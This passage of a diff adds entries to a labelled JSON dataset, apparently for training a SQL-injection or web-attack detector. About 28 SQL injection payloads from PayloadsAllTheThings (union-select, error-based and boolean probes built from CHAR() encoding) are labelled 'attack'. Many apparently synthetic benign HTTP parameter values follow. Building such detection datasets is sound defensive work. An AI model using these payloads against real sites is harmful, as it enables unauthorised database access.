+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 'INJ'||'ECT'||'XXX'",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "40184",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "nuda drudes",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "c/ del ferrocarril, 152,",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "2070765320009143",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "1902",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "ulldemol bujeque",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "plaa caudillo 60",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "maala8",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "peuela sains",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "c/ 57 15, 9g",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "empeltre",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "estantalar",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "21924971z",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "25260",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "h9655",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "dunlap-leaud@videospornocaseros.ye",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "pobla de montorns, la",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "kong-que",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "goggin",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "plebs cadevall",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "cueva de montesinos 80 11-g",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "xiangsen",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "01633578a",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "5562206225092204",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "4377",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "molledo basagaa",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "carretera de las ermitas 188",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "lauriaul",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "nype.shafer@canovash.bv",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "merindad de ro ubierna",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "robieux",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "darby",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "thalasso.chappell@titulosoficiales.jp",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "0350022340129740",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "julisa",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "03266253t",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "0992218178104844",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "5788",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "graziana",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "16648",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "07u8e37ia",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "07901950r",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "39638",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "portal",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "marino",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "c/ garcia morente 129",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "2533839429419532",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "natn",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "68201502q",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "36680",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "*r6t58a",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "r8cid0va",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "14977979b",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "45183",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "d2s7sp79ro",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "spiegel-haake@convention.no",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "turcia",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "r92e1*56e",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "pu6ue97",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "72367579b",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "1721278325772936",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "starr-fjelmose@cdgranadabaila.travel",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "47815",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "2354",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "raian",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "78977050h",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "24224",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "58772485x",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "39515",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "zanquita",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "14ab214c6n",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "quartet@cabare.com.cs",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "espluga de francol l'",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "acre",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "52137467d",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "31282",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "62si27t8ico",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "encrasar",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "86943454g",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "lubna",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "pealver palenzuela",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "zabalza",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "erickson",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "procacci",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "conde",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "25330",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "mialgi5",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "pablo iglesias s/n 2?f",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "technoso",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "briseboi",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "39699852n",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "37115",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "comisorio",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "pesche@campodegolf.com.sy",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "valseca",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "419747iv6",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "orientalista",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "sala@mystyleperfume.ls",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "7771884953425478",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "telema",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "25109956m",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "45370",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "arrego76arse",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "1i6p06ej7",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "54709157t",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "1571256483586961",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "sibonet",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "estrada mendiarte s/n, 10?a",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "sa89gn",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "cojera",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "calle madagascar 130",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "ineluctable",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "pozzetto@miplat.am",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "cervera de la caada",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "havis",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "cooksey",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "gomero gallardo",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "paratge ter, 33,",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "vial",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "37905890g",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "40529",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "encalador",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "ten.tar",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "vitola@23horas.ad",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "45810",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "desconsolar",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "infante juan manuel s/n 5?a",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "9738066615220073",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "blondell3",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "peller@arvigar.gs",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "49135",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "escultrico",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "69634179t",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "6689689469452036",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "3318",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "salgado pladellorens",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "villadoz",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "8ienne2s6",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "horcajo de montemayor",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "sensualmente",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "fabrizio",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "c/ gravina, s/n",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "6453670410602968",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "iraola rudi",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "castellanos de zapardiel",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "tweddle",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "sirevici",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "90230020p",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "6034871098442134",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "vingelli9@custombikesclothes.fr",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "fuentelmonge",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "m*ule38",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "cimorra",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "knippenberg@soyriojano.cf",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "iza",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "martinn sampayo",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "calle plantio, 178,",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "benning",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "sask",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "rudie@deuxmanagement.jo",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "guilas",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "ramblizo",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "8043015940180984",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "6087",
+    "label": "benign",
+    "category": "httpparams-norm",
